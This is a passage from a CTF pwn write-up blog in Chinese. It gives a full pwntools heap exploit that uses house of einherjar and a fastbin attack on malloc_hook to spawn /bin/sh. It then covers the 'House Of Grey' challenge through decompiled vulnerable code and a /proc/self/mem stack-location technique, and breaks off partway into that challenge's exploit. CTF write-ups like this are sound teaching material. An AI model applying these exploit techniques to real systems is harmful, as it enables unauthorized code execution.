<li>malloc_hook &#x3D; libc_base + 0xf1147, realloc_hook &#x3D; realloc_addr + 20</li>
</ol>
<h4 id="execve执行情况如下"><a href="#execve执行情况如下" class="headerlink" title="execve执行情况如下"></a>execve执行情况如下</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x7fe7cb15715d &lt;exec_comm+2285&gt;    call   execve &lt;0x7fe7cb132770&gt;<br>path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */<br>argv: 0x7ffe640ad200 ◂— 0x0<br>envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— &#x27;LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6&#x27;<br></code></pre></td></tr></table></figure>

<h4 id="payload构造如下"><a href="#payload构造如下" class="headerlink" title="payload构造如下"></a>payload构造如下</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#modify malloc_hook</span><br>realloc_addr = libc_base + lib.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>li(<span class="hljs-string">&#x27;realloc_addr &#x27;</span> +  <span class="hljs-built_in">hex</span>(realloc_addr))<br>gadget = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>one_gadget = libc_base + gadget[<span class="hljs-number">3</span>]<br>p = <span class="hljs-string">&#x27;\x11&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">8</span>)<br>p += p64(one_gadget) <span class="hljs-comment"># realloc_hook</span><br><span class="hljs-comment">#mallok_hook then call realloc for banance stackthen call one_gadget</span><br>p += p64(realloc_addr + <span class="hljs-number">20</span>) <span class="hljs-comment"># malloc_hook</span><br>p += <span class="hljs-string">&#x27;\n&#x27;</span><br>ad(<span class="hljs-number">0x68</span>, p)<br><br></code></pre></td></tr></table></figure>

<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># get shell</span><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure>



<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;timu&quot;</span><br>libFile  = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>libFile  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Data:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-comment">#def q():</span><br><span class="hljs-comment">#	sla(&#x27;:&#x27;, str(5))</span><br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># idx 0</span><br>	ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># idx 1</span><br>	ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x68</span>) <span class="hljs-comment"># idx 2</span><br>	ad(<span class="hljs-number">0xF0</span>, <span class="hljs-string">&#x27;E\n&#x27;</span>)      <span class="hljs-comment"># idx 3</span><br>	ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;F\n&#x27;</span>) <span class="hljs-comment">#for avoid merge to top chunk</span><br>	rm(<span class="hljs-number">2</span>)<br>	<span class="hljs-comment"># use house of einherjar</span><br>	p = <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x60</span><br>	p += p64(<span class="hljs-number">0x190</span>)<br>	ad(<span class="hljs-number">0x68</span>, p)<br><br>	rm(<span class="hljs-number">2</span>) <span class="hljs-comment">#for fastbin attack, now make it in fastbin</span><br>	<span class="hljs-comment"># trigger house of eiherjar</span><br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">3</span>)<br>	<span class="hljs-comment"># leak main_arena</span><br>	ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>	dp()<br>	main_arena = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">0x58</span><br>	libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>	li(<span class="hljs-string">&#x27;main_arena &#x27;</span> + <span class="hljs-built_in">hex</span>(main_arena))<br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> +  <span class="hljs-built_in">hex</span>(libc_base))<br>	<span class="hljs-comment"># fastbin attack to malloc_hook - 0x23</span><br>	p = <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x71</span>)<br>	p += p64(main_arena - <span class="hljs-number">0x33</span>)<br>	p += <span class="hljs-string">&#x27;\n&#x27;</span><br>	ad(<span class="hljs-number">0xA0</span>, p)<br><br>	ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#for ajust fastbin</span><br>	<span class="hljs-comment">#modify malloc_hook</span><br>	realloc_addr = libc_base + lib.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;realloc_addr &#x27;</span> +  <span class="hljs-built_in">hex</span>(realloc_addr))<br>	gadget = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>	one_gadget = libc_base + gadget[<span class="hljs-number">3</span>]<br>	p = <span class="hljs-string">&#x27;\x11&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">8</span>)<br>	p += p64(one_gadget)<br>	<span class="hljs-comment">#mallok_hook then call realloc for banance stackthen call one_gadget</span><br><br>	p += p64(realloc_addr + <span class="hljs-number">20</span>)<br>	p += <span class="hljs-string">&#x27;\n&#x27;</span><br>	ad(<span class="hljs-number">0x68</span>, p)<br>	<span class="hljs-comment"># get shell</span><br>	sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	<span class="hljs-comment">#db()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br><br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br><br>	exploit()<br>	finish()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>




<h1 id="House-Of-Grey"><a href="#House-Of-Grey" class="headerlink" title="House Of Grey"></a>House Of Grey</h1><h2 id="来源-3"><a href="#来源-3" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度-2"><a href="#难度-2" class="headerlink" title="难度"></a>难度</h2><p>8 &#x2F; 10</p>
<h2 id="保护-3"><a href="#保护-3" class="headerlink" title="保护"></a>保护</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<h2 id="简单描述-2"><a href="#简单描述-2" class="headerlink" title="简单描述"></a>简单描述</h2><p>该题没有明显的分界点, 涉及的知识也比较陌生,十分经典. 通过创建子进程方式避免被直接调试,且有记时,保护全开,要理解linux下的一些文件.如 &#x2F;proc&#x2F;self&#x2F;下的文件,通过seccomp-tools检验程序, 发现禁用execve函数,只能通过open,read,write获取flag</p>
<h2 id="vul-4"><a href="#vul-4" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-6Ch]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-64h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-64h]</span><br>  <span class="hljs-type">void</span> *v6; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">//---------------------stack ouverflow</span><br>  <span class="hljs-type">void</span> *v8; <span class="hljs-comment">// [rsp+48h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> nptr; <span class="hljs-comment">// [rsp+50h] [rbp-30h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+80h] [rbp+0h]</span><br><br>  v10 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get into my room. Just find something!\n&quot;</span>);<br>  v6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100000uLL</span>);<br>  <span class="hljs-keyword">if</span> ( !v6 )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;malloc&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_14D2(<span class="hljs-number">100000LL</span>) )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  v8 = v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">29</span>; ++i )<br>  &#123;<br>    sub_FEE();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So man, what are you finding?&quot;</span>);<br>       <span class="hljs-comment">//length 40 can be stack overflow--------</span><br>        buf[(<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)((<span class="hljs-type">unsigned</span> __int64)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">40uLL</span>) - <span class="hljs-number">1</span>)] = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)check(buf) )<span class="hljs-comment">//不能读取flag文件</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fd = open(buf, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>          perror(<span class="hljs-string">&quot;open&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>: <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So, Where are you?&quot;</span>);<br>        read(<span class="hljs-number">0</span>, &amp;nptr, <span class="hljs-number">0x20</span>uLL);<br>        v1 = strtoull(&amp;nptr, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);<br>        lseek(fd, v1, <span class="hljs-number">0</span>); <span class="hljs-comment">//可以定位fd的地址</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many things do you want to get?&quot;</span>);<br>        read(<span class="hljs-number">0</span>, &amp;nptr, <span class="hljs-number">8uLL</span>);<br>        v4 = atoi(&amp;nptr);<br>        <span class="hljs-keyword">if</span> ( v4 &lt;= <span class="hljs-number">100000</span> )<br>        &#123;<br>          v5 = read(fd, v8, v4);<br>          <span class="hljs-keyword">if</span> ( v5 &lt; <span class="hljs-number">0</span> )<br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error read&quot;</span>);<br>            perror(<span class="hljs-string">&quot;read&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>          &#125;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You get something:&quot;</span>);<br>          write(<span class="hljs-number">1</span>, v8, v5);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You greedy man!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to give me?&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content: &quot;</span>);<br>        read(<span class="hljs-number">0</span>, v8, <span class="hljs-number">0x200</span>uLL);                  <span class="hljs-comment">// v8 can be modifyed</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>vul: 存在堆栈溢出, 通过覆盖 v8实现任意地址读写</p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>由于可以读取除了flag之外的文件，就可以读取&#x2F;proc&#x2F;self&#x2F;maps文件,Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。&#x2F;proc&#x2F;self&#x2F;mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
<p>程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，但可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，就需要确定栈的地址。</p>
<p>但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，并不知道程序的栈地址。但是，可以通过读取&#x2F;proc&#x2F;self&#x2F;mem文件，来搜索标记，已确定程序的栈地址, 注意,堆栈的生长方向是由高地址向低地址生长。</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol>
<li>如何调试? 使用ida把超时函数的exit给patch掉, 通过gdb attach的方式调试子进程</li>
<li>漏洞 1: 明显的漏洞点就在执行1功能的时候就有字符串溢出, 可以覆盖v8变量通过4功能实现任意地址写入.</li>
<li>漏洞 2: 可以通过输入打开文件为 &#x2F;proc&#x2F;self&#x2F;maps来获取各个基址</li>
<li>绕过PIE，以及利用&#x2F;proc&#x2F;self&#x2F;mem来读取任意地址的内容</li>
<li>通过在&#x2F;proc&#x2F;self&#x2F;mem中搜索’&#x2F;proc&#x2F;self&#x2F;maps’字符串来定位堆栈的地址</li>
<li>计算出read ret地址,构造rop链读取flag</li>
</ol>
<h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><h3 id="获取基址"><a href="#获取基址" class="headerlink" title="获取基址"></a>获取基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>)<br><br><span class="hljs-comment">#leaking base addr</span><br>p = <span class="hljs-string">&#x27;/proc/self/maps&#x27;</span><br>fid(p)<br>get(<span class="hljs-number">1500</span>)<br><br>ru(<span class="hljs-string">&#x27;You get something:\n&#x27;</span>)<br>exe_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>ru(<span class="hljs-string">&#x27;[heap]\n&#x27;</span>)<br>stack_start = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>ru(<span class="hljs-string">&#x27;-&#x27;</span>)<br>stack_end =   <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><br>ru(<span class="hljs-string">&#x27;rw-p 00000000 00:00 0 \n&#x27;</span>)<br><br>libc_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>li(<span class="hljs-string">&#x27;exe_base  &#x27;</span> + <span class="hljs-built_in">hex</span>(exe_base))<br>li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>li(<span 